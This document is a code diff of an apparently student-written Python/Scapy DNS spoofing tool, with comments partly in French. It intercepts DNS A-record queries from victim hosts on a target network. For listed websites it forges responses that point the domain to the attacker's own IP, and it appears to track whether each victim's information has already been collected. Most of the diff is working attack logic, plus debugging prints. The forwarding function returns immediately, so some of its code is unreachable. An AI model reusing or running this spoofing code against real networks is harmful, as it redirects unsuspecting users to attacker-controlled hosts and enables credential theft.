@@ -8,39 +8,50 @@ from environment import *
 from mac_management import *
 
 def dns_sorting_start(pkt):
+
     websites = WEBSITES
+
     dns= ATTACK_STATUS['dns']
     victims = ATTACK_STATUS['victims']
+
     network = ipaddress.ip_network(victims, strict=False)
 
     if pkt.haslayer(IP) and pkt.haslayer(DNS): #check if there is an IP and DNS layer
         src_ip = pkt[IP].src 
         dst_ip = pkt[IP].dst
         dns_check(websites, dns, network, pkt, src_ip, dst_ip)
-    #comportement sinon ?????
+
 
 def dns_check(websites, dns, network, pkt, src_ip, dst_ip):
-    if pkt[DNS].qr == 0 and ipaddress.ip_address(src_ip) in network and dst_ip == dns : #if it's a request we want to block the one from the victim to the dns server
+
+    if pkt[DNS].qr == 0 and ipaddress.ip_address(src_ip) in network and dst_ip == dns: #if it's a request we want to block the one from the victim to the dns server
+
         domain_name = pkt[DNS][DNSQR].qname.decode('utf-8')
         website = match_website(websites, domain_name)
+
         if website: #if there is a corresponding website in out data
+
             if src_ip not in website[4]: #if we didn't already colelcted the information for this IP on this website
-                if pkt[DNS].qd.qtype == 28:
-                    return
-                else:
+                if pkt[DNS].qd.qtype == 1:
+                    print('-----------------------------------------------------------------------', flush=True)
+                    print("CREATE DNS RESPONSE , " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
+                    print('-----------------------------------------------------------------------', flush=True)
                     create_dns_response(website, dns, network, pkt, src_ip, dst_ip, domain_name)        
                     return
-
-    #SI C EST UNE REPONSE, ON FORWARD JUSTE ?
-    #elif pkt[DNS].qr == 1 and src_ip == dns and ipaddress.ip_address(dst_ip) in network and match_website() : #if it's a response we want to block the one from the dns server to the victim
-    #    if pkt[DNS].an : #check if there is a response
-    #        domain_name = pkt[DNS].an.rrname.decode('utf-8')
-    #        website = match_website(website, domain_name)
-    #        if website: #if there is a corresponding website in out data
-    #            if dst_ip not in website[4]: #if we didn't already colelcted the information for this IP on this website
-    #                create_dns_response(website, dns, network, pkt, src_ip, dst_ip)
-    #                return
-    forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package
+                else:
+                    return
+            else:
+                forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package
+        else:
+            print('-----------------------------------------------------------------------', flush=True)
+            print("FORWARD 1 , " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
+            print('-----------------------------------------------------------------------', flush=True)
+            forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package
+    else:
+        print('-----------------------------------------------------------------------', flush=True)
+        print("FORWARD 2, " + str(pkt[DNS][DNSQR].qname.decode('utf-8')) + ", " + str(pkt[DNS].qd.qtype) + " FROM " + str(pkt[Ether].src) + " TO " + str(pkt[Ether].dst), flush=True)
+        print('-----------------------------------------------------------------------', flush=True)
+        forward_dns(pkt,dst_ip) #if something is wrong, it will forward the package
 
 def remove_trailing_dot(s):
     if s.endswith('.'):
@@ -56,10 +67,10 @@ def match_website(websites,domain_name):
 
 def forward_dns(pkt, dst_ip):
     return
-    #A VERIFIER !!!
-    # pkt[IP].chksum = None  
-    # pkt[UDP].chksum = None  
+    pkt[IP].chksum = None  
+    pkt[UDP].chksum = None  
     
+    self_mac = get_if_hwaddr(str(ATTACK_STATUS['iface']))
     pkt[Ether].src = pkt[Ether].dst #we replace the sender MAC with our
     dst_MAC = get_MAC(dst_ip)#we replace the destination MAC by the real one 
 
@@ -67,7 +78,7 @@ def forward_dns(pkt, dst_ip):
         pkt[Ether].dst = dst_MAC
         sendp(pkt)
         if IP in pkt:
-            print("Forwarding package from" + pkt[IP].src + "to" + pkt[IP].dst)
+            print("Forwarding package from" + str(pkt[IP].src) + " to " + str(pkt[IP].dst) + " for domain name "+ str(pkt[DNS][DNSQR].qname.decode('utf-8')) + " On a request " + str(pkt.getlayer(DNS).qd.qtype))
         else :
             print("Forwarding package")
     else:
@@ -76,7 +87,6 @@ def forward_dns(pkt, dst_ip):
 
 
 def create_dns_response(website, dns, network, pkt, req_src_ip, req_dst_ip, domain_name):
-    print("CREATE DNS RESPONSE CALLED")
     #we just need to switch everything and add the response with our mavelous IP
     iface = str(ATTACK_STATUS['iface'])
     spoofer_IP = get_if_addr(iface)
@@ -91,11 +101,5 @@ def create_dns_response(website, dns, network, pkt, req_src_ip, req_dst_ip, doma
         qd=pkt[DNS].qd, #we capy the request
         an=DNSRR(rrname=domain_name,ttl=10,rdata=spoofer_IP)
     )
-
     fake_dns_response = fake_ether/fake_IP/fake_UDP/fake_DNS
-    print("Will send a package")
     sendp(fake_dns_response, verbose=False)
-
-
-#def create_dns_after_response(website, dns, network, pkt, src_ip, dst_ip):
-    #euuuuuuuh en vrai jsp, on bloque juste nan ? 
